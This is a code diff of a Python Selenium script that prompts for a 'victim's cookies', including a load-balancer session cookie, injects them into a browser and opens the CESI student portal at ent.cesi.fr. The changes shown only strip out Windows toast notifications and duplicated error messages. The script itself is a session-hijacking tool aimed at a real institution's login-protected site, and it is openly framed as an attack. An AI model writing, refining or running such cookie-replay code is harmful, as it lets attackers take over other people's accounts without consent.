@@ -1,10 +1,4 @@
 from selenium import webdriver
-from win10toast import ToastNotifier
-
-toast = ToastNotifier()
-from win10toast import ToastNotifier
-
-toast = ToastNotifier()
 
 
 ent_cookies = [
@@ -73,11 +67,6 @@ ent_accueil_url = "https://ent.cesi.fr/accueil-apprenant"
 
 
 print("please enter victim's cookies : ")
-toast.show_toast(
-    "Please enter victim's cookies",
-    duration = 2,
-    threaded = True,
-)
 
 
 BIGipServer = input("BIGipServer~ADMIN~pool-WAYF-https > ").replace(' ', '')
@@ -116,11 +105,6 @@ for cookie in ent_cookies:
 if good : print("✅ | Cookies set !\n\t", driver.get_cookies())
 else :
     print("❌ | Error while setting cookies !")
-    toast.show_toast(
-        "❌ | Error while setting cookies !",
-        "Please check your cookies and try again.",
-        threaded = True,
-    )
 
     try:
         driver.add_cookie(cookie)
@@ -130,14 +114,6 @@ else :
         good = False
     
 
-if good : print("✅ | Cookies set !\n\t", driver.get_cookies())
-else :
-    print("❌ | Error while setting cookies !")
-    toast.show_toast(
-        "❌ | Error while setting cookies !",
-        "Please check your cookies and try again.",
-        threaded = True,
-    )
-
+print("✅ | Cookies set !\n\t", driver.get_cookies()) if good else print("❌ | Error while setting cookies !")
 
 driver.get(ent_accueil_url)
